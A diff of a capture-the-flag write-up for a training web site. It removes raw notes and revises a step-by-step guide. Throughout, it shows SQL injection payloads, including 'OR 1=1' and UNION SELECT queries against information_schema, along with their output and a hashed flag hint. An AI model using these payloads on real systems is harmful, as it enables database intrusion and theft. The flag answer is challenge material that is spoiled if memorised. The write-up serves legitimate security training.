@@ -1,33 +1,3 @@
-0 OR 1=1
-
-ID: 0 OR 1=1 
-Title: Hack me ?
-Url : borntosec.ddns.net/images.png
-
-
-
-0 UNION SELECT table_schema, table_name FROM information_schema.tables
-Trouver la table list_images
-
-0 UNION SELECT table_name, column_name FROM information_schema.columns
-ID: 0 UNION SELECT table_name, column_name FROM information_schema.columns 
-Title: id
-Url : list_images
-ID: 0 UNION SELECT table_name, column_name FROM information_schema.columns 
-Title: url
-Url : list_images
-ID: 0 UNION SELECT table_name, column_name FROM information_schema.columns 
-Title: title
-Url : list_images
-ID: 0 UNION SELECT table_name, column_name FROM information_schema.columns 
-Title: comment
-Url : list_images
-
-0 UNION SELECT comment,url FROM list_images
-ID: 0 UNION SELECT comment,url FROM list_images 
-Title: borntosec.ddns.net/images.png
-Url : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
-
 # Steps
 
 ### 1. Check if there is a breach to exploit 
@@ -58,6 +28,6 @@ Basically the same process
 Now that we have the database/table/columns's names, we can associate them in our requests to get the flag :
 
 To identify the flag :
-`0 UNION SELECT ID, Title FROM list_images.Member_images`
+`0 UNION SELECT ID, Title FROM Member_images.list_images`
 
-And to get its confidentials values : `0 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users WHERE user_id = 5`
+And to get its confidentials values : `0 UNION SELECT title, comment FROM Member_images.list_images WHERE ID = 5`
